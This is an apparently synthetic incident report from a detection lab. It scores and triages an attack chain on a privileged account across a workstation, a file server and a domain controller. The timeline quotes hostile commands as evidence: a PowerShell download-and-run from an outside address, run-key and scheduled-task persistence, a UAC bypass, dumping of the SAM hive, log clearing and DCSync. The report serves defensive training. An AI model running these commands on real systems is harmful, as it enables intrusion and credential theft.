# CASE-007: adm.rossi

Risk 115 (critical), rank 1 of 14 cases. Highest alert severity: critical. Window: 2026-10-10T09:40:00Z to 2026-10-10T10:10:00Z.

## Why this risk score

- 6 points: DET-004 (high)
- 3 points: DET-007 (medium)
- 10 points: DET-009 (critical)
- 10 points: DET-010 (critical)
- 10 points: DET-011 (critical)
- 6 points: DET-012 (high)
- 6 points: DET-013 (high)
- 6 points: DET-014 (high)
- 6 points: DET-015 (high)
- 6 points: DET-017 (high)
- 6 points: DET-020 (high)
- 6 points: DET-021 (high)
- 24 points: 7 ATT&CK tactics: Execution, Persistence, Discovery, Privilege Escalation, Credential Access, Defense Impairment, Lateral Movement
- 5 points: critical host: DC-01, SRV-FILE-01
- 5 points: privileged account: adm.rossi

## ATT&CK

Tactics in the order they started: Execution, Persistence, Discovery, Privilege Escalation, Credential Access, Defense Impairment, Lateral Movement.
Techniques: T1003, T1003.001, T1003.006, T1021.002, T1033, T1047, T1053.005, T1059.001, T1547.001, T1548.002, T1685.005.

## Alerts

| Alert | Time (UTC) | Rule | Severity | Summary |
|---|---|---|---|---|
| A-0015 | 2026-10-10T09:40:00Z | DET-004 Encoded PowerShell command line | high | Encoded PowerShell command line (user=adm.rossi, host=WS-ADM-01) |
| A-0016 | 2026-10-10T09:40:04Z | DET-021 Suspicious PowerShell script text (decode-and-run, download-and-run, credential tools, AMSI tampering) | high | Suspicious PowerShell script text (decode-and-run, download-and-run, credential tools, AMSI tampering) (host=WS-ADM-01) |
| A-0017 | 2026-10-10T09:40:35Z | DET-014 Startup (Run key) entry pointing at a script, shell, or user-folder file | high | Startup (Run key) entry pointing at a script, shell, or user-folder file (host=WS-ADM-01, process_name=powershell.exe, registry_key=HKU\S-1-5-21-1004336348-1177238915-682003330-1105\Software\Microsoft\Windows\CurrentVersion\Run\Updater) |
| A-0018 | 2026-10-10T09:40:50Z | DET-013 Scheduled task created with a script, shell, or user-folder action | high | Scheduled task created with a script, shell, or user-folder action (user=adm.rossi, host=WS-ADM-01) |
| A-0019 | 2026-10-10T09:42:00Z | DET-007 Discovery commands launched from PowerShell or an Office app | medium | Discovery commands launched from PowerShell or an Office app (user=adm.rossi, host=WS-ADM-01) |
| A-0020 | 2026-10-10T09:42:15Z | DET-007 Discovery commands launched from PowerShell or an Office app | medium | Discovery commands launched from PowerShell or an Office app (user=adm.rossi, host=WS-ADM-01) |
| A-0021 | 2026-10-10T09:44:00Z | DET-015 UAC bypass - per-user registry hijack of an auto-elevating program | high | UAC bypass - per-user registry hijack of an auto-elevating program (host=WS-ADM-01, process_name=powershell.exe) |
| A-0022 | 2026-10-10T09:47:00Z | DET-009 LSASS memory opened by an unexpected program | critical | LSASS memory opened by an unexpected program (host=WS-ADM-01, process_name=powershell.exe) |
| A-0023 | 2026-10-10T09:49:00Z | DET-010 Credential-dumping command (registry hives, NTDS.dit, comsvcs, ProcDump) | critical | Credential-dumping command (registry hives, NTDS.dit, comsvcs, ProcDump) (user=adm.rossi, host=WS-ADM-01, process_name=reg.exe) |
| A-0024 | 2026-10-10T09:52:00Z | DET-017 Event log cleared or audit policy weakened | high | Event log cleared or audit policy weakened (user=adm.rossi, host=WS-ADM-01) |
| A-0025 | 2026-10-10T10:00:00Z | DET-012 Service installed that runs a shell, a script host, or a file from an admin share | high | Service installed that runs a shell, a script host, or a file from an admin share (host=SRV-FILE-01, service_name=PSEXESVC, user=adm.rossi) |
| A-0026 | 2026-10-10T10:01:00Z | DET-020 Remote command run through WMI or WinRM | high | Remote command run through WMI or WinRM (user=adm.rossi, host=SRV-FILE-01, parent_process=wmiprvse.exe, process_name=cmd.exe) |
| A-0027 | 2026-10-10T10:10:00Z | DET-011 DCSync - directory replication requested by a non-domain-controller account | critical | DCSync - directory replication requested by a non-domain-controller account (user=adm.rossi, host=DC-01) |

## Timeline

- 2026-10-10T09:40:00Z powershell.exe started on WS-ADM-01 by adm.rossi, launched by winword.exe [A-0015]
  - `powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGQAZQB0AGwAYQBiAC0AcwBhAG0AcABsAGUALQBzAGMAMAA3ACcA`
- 2026-10-10T09:40:04Z PowerShell on WS-ADM-01 ran a script block for adm.rossi [A-0016]
  - `IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.60/stage2.ps1')`
- 2026-10-10T09:40:35Z powershell.exe set a registry value on WS-ADM-01 [A-0017]
  - `HKU\S-1-5-21-1004336348-1177238915-682003330-1105\Software\Microsoft\Windows\CurrentVersion\Run\Updater = powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGQAZQB0AGwAYQBiAC0AcwB...`
- 2026-10-10T09:40:50Z schtasks.exe started on WS-ADM-01 by adm.rossi, launched by powershell.exe [A-0018]
  - `schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR "powershell.exe -nop -w hidden -c IEX"`
- 2026-10-10T09:42:00Z whoami.exe started on WS-ADM-01 by adm.rossi, launched by powershell.exe [A-0019]
  - `whoami.exe /all`
- 2026-10-10T09:42:15Z net.exe started on WS-ADM-01 by adm.rossi, launched by powershell.exe [A-0020]
  - `net.exe group "Domain Admins" /domain`
- 2026-10-10T09:44:00Z powershell.exe set a registry value on WS-ADM-01 [A-0021]
  - `HKU\S-1-5-21-1004336348-1177238915-682003330-1105\Software\Classes\ms-settings\shell\open\command\(Default) = powershell.exe -nop -w 1 -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGQAZQB0AGwAYQBiAC0AcwBh...`
- 2026-10-10T09:47:00Z powershell.exe opened lsass.exe on WS-ADM-01 with access 0x1410 [A-0022]
- 2026-10-10T09:49:00Z reg.exe started on WS-ADM-01 by adm.rossi, launched by cmd.exe [A-0023]
  - `reg save HKLM\SAM C:\Windows\Temp\s.save`
- 2026-10-10T09:52:00Z adm.rossi cleared the Security event log on WS-ADM-01 [A-0024]
- 2026-10-10T10:00:00Z The service PSEXESVC was installed on SRV-FILE-01 by adm.rossi, running as LocalSystem [A-0025]
  - `%SystemRoot%\PSEXESVC.exe`
- 2026-10-10T10:01:00Z cmd.exe started on SRV-FILE-01 by adm.rossi, launched by wmiprvse.exe [A-0026]
  - `cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1.out 2>&1`
- 2026-10-10T10:10:00Z adm.rossi read domainDNS directory data on DC-01 with access mask 0x100 [A-0027]
  - `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}`

## What to check

**DET-004**

- Decode the base64 (UTF-16LE) and read what it does.
- Check the parent process - Office apps, browsers, and script hosts are red flags.
- Look at what else ran on the host in the 10 minutes around the event.
- Check for outbound network connections from the PowerShell process.

**DET-021**

- Read the script text. What does it download, decode or load, and where from?
- What started PowerShell? (Check the process event around the same time.)
- Did the host contact the address the script names?

**DET-014**

- What wrote the value, and what does the value run? Open the file if it still exists.
- Which account owns the key (HKCU) or is it machine wide (HKLM)?
- When was the file first seen on this host?

**DET-013**

- Read the task action in full. Does it run a script or a file in a user-writable folder?
- Which account created it, and from which parent process?
- When will it run, and as which account?

**DET-007**

- What launched the parent process? An Office document or a browser download is a red flag.
- Did encoded PowerShell (DET-004) or a login after many failures (DET-005) happen on this host or user shortly before?
- Is this user normally an administrator who runs these commands?
- What did the same host run in the next 10 minutes? Discovery is usually followed by credential theft or lateral movement.

**DET-015**

- What wrote the key and what command does it contain?
- Did the matching auto-elevating program start within seconds of the write?
- What did the elevated process do next?

**DET-009**

- Which program opened LSASS and where does it live on disk? A file in a user folder or Temp is a red flag.
- What started that program, and who was signed in?
- Read the call trace if the log has one. A trace that only passes through Windows and .NET files (for example System.ni.dll) points to a process listing such as Get-Process. A frame shown as UNKNOWN is code running from memory with no file behind it, and comsvcs.dll or dbgcore.dll frames mean a dump is being written. This is a hint to look closer, not proof either way.
- Was a dump file written in the next minute (look for new .dmp files on the same host)?

**DET-010**

- Read the whole command line. Where was the output written, and is that path normal?
- Was the user an administrator doing planned work?
- Did anything read or copy the output file afterwards?

**DET-017**

- Which log was cleared, by which account, from which program or session?
- Was there a change ticket or a rotation job for this host at this time?
- What else happened on this host in the 30 minutes before the clear? (See the case timeline.)

**DET-012**

- What does the service command do? Decode or read any script it points to.
- Which account installed it, and from which source address was the remote session made?
- Was the same service installed on several machines in a short time (lateral movement)?

**DET-020**

- Which account authenticated, and from which computer? (Check the logon events just before.)
- What did the command do, and what did it start next?
- Is the source computer one that normally manages this one?

**DET-011**

- Is the account a known synchronization account? Where is the replication request coming from?
- Does the source host belong to a domain controller or the sync server?
- Did the same account sign in anywhere unusual in the last day?

## What to do

**DET-004**

- Isolate the host if the decoded command downloads or executes something.
- Collect the process tree and the decoded payload as evidence.
- Hunt for the same command line or parent process across the fleet.

**DET-021**

- Isolate the host if the script is not recognised.
- Capture the full script text from the log before anything is cleaned up.
- Block any download address it names and search for other hosts that contacted it.

**DET-014**

- Remove the value after saving a copy, and quarantine the file it points to.
- Look for the same value on other hosts.
- Review how the writing process got there (see the case timeline).

**DET-013**

- Disable and export the task, then collect the file it runs.
- Check the account that created it for other persistence (run keys, new services).
- Remove the task after evidence is collected.

**DET-007**

- Treat as part of a possible intrusion if another alert fired for the same user or host.
- Isolate the host if the chain of parent processes is not explained.
- Collect the process tree and command lines for the host.

**DET-015**

- Remove the key and isolate the host.
- Treat the account as compromised, since it already had a way to run code.
- Hunt for the same key on other hosts.

**DET-009**

- Isolate the host. Treat every account that was signed in on it as exposed.
- Reset those credentials and invalidate their tickets.
- Collect the program and the dump file as evidence.

**DET-010**

- Isolate the host and treat the dumped secrets as stolen.
- For NTDS.dit or SAM, reset the affected credentials, including krbtgt twice for domain-wide exposure.
- Delete the output file only after it has been collected as evidence.

**DET-017**

- Treat an unexplained clear as a sign of an intrusion until shown otherwise.
- Collect copies of logs from a central log store, since the local ones are gone.
- Check what the same account did on other hosts.

**DET-012**

- Stop and remove the service, and isolate the host if the command is not recognised.
- Find the source host and account of the remote session and treat that account as compromised.
- Hunt for the same service name or command across the fleet.

**DET-020**

- Isolate the source computer if it is not a management host.
- Reset the account used and look at where else it signed in.

**DET-011**

- Disable the account and isolate the source host.
- Treat all domain credentials as exposed. Reset krbtgt twice and every privileged account.
- Review who holds replication rights and remove any that are not needed.

---
Generated by Detection Lab from synthetic data. Nothing in this note describes a real incident.
